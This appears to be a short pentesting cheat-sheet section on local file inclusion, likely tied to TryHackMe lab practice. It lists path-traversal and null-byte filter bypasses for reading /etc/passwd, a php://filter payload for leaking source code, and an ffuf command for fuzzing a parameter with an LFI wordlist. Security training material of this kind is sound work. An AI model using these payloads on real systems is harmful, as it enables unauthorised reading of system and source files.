# 4 LFI

- Check for file inclusions to the file `/etc/passwd`.
- Check for filter bypass
    - Use `.././..` instead of `../..`.
    - Use null bytes `%00` to bypass filters.
    - Use suffix `/etc/passwd/.` to bypass filters.
    - Use relative paths `dir/../../file/path` to bypass filters.
- Check for source code using

```
php://filter/convert.base64-encode/resource=post.php
```

- For nice file path targets see this [TryHackMe](https://tryhackme.com/room/fileinc) room.
- Fuzzing for LFI can be done using ffuf with

```shell
ffuf -u http://$ip/index.php?param=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fw wordcount
```

- Go for remote file inclusions.
